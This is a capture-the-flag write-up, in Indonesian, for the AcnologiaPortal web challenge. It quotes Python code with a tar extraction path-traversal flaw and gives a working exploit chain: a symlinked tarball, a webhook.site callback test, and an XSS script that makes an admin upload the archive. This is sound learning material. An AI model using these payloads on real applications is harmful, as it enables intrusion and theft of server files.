# AcnologiaPortal
#web #medium #xss #zipslip 

## Inisiasi
```sh
./build-docker.sh
```


## Eksploitasi
![](attachments/Pasted%20image%2020220610142524.png)

Testing XSS pada fitur report.
```html
<img src="https://webhook.site/unique-id">
```

Vulnerability zipslip pada `util.py`, `tar.extractall()` memperbolehkan ekstraksi absolute dan relative path.
```python
def extract_firmware(file):
    tmp  = tempfile.gettempdir()
    path = os.path.join(tmp, file.filename)
    file.save(path)

    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)

        rand_dir = generate(15)
        extractdir = f"{current_app.config['UPLOAD_FOLDER']}/{rand_dir}"
        os.makedirs(extractdir, exist_ok=True)
        for tarinfo in tar:
            name = tarinfo.name
            if tarinfo.isreg():
                try:
                    filename = f'{extractdir}/{name}'
                    os.rename(os.path.join(tmp, name), filename)
                    continue
                except:
                    pass
            os.makedirs(f'{extractdir}/{name}', exist_ok=True)
        tar.close()
        return True

    return False
```

Fungsi `extract_firmware()` dapat diakses melalui `/api/firmware/upload` seperti pada yang tertampil pada `routes.py`.
```python
@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403

@web.route('/review', methods=['GET'])
@login_required
@is_admin
def review_report():
    Reports = Report.query.all()
    return render_template('review.html', reports=Reports)

```

Buat sebuah symbolic link dengan cara berikut
```sh
sudo mkdir -p /app/application/static/js/
sudo echo "flag" > /flag.txt

# membuat symbolic link ke /flag.txt di /app/application/static/js/flag.txt
sudo ln -s /flag.txt /app/application/static/js/flag.txt
ls -l /app/application/static/js/flag.txt
```

Buat sebuah tgz yang mengarah ke symbolic link `/app/application/static/js/flag.txt`
```sh
tar -czPf exploit.tgz /app/application/static/js/flag.txt

# cek symbolic link dan isi archive pada pada exploit.tgz
vim exploit.tgz
```

Copy tgz tersebut dalam base64.
```sh
base64 -w 0 exploit.tgz
```

Buat admin upload file zip tersebut dengan menginputkan script ini ke dalam kolom report dengan menggunakan XSS.
```html
<script>
const byteCharacters = atob("H4sIAAAAAAAAA+3PUQqDMAzG8R6lJ1hip+15irChyCpaYcdf8HGge9jY0/8H4Qsk0FTyPIvVNPS5DuUha7XsZVzlNuX7pT6r+5aalNKe5j33vmlDp7HRGG0vqF7V+fC7E45t9uHFe7eUcvrMpzkAAAAAAAAAAAAAAAAAAH/0AsHNucgAKAAA");
const byteNumbers = new Array(byteCharacters.length);
for (let i = 0; i < byteCharacters.length; i++) {
	byteNumbers[i] = byteCharacters.charCodeAt(i);
}
const byteArray = new Uint8Array(byteNumbers);
const blob = new Blob([byteArray], {type: 'application/gzip'});
var formData = new FormData();
formData.append("file", blob, "exploit.tgz");

var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost:1337/api/firmware/upload");
xhr.withCredentials = true;
xhr.send(formData);
</script>
```


## Sumber
- https://github.com/konradzb/public_writeups/blob/main/Cyber%20Apocalypse%20CTF%202022/WEB/Acnologia%20Portal/Acnologia_Portal.md
- https://jamesasec.io/ctf/cyber-apocalypse-2022/acnologia-portal.html
- https://www.youtube.com/watch?v=1x_ZNI7E61I&t=11602s
- https://snyk.io/research/zip-slip-vulnerability
- https://www.dubget.com/file-upload-via-xss.html
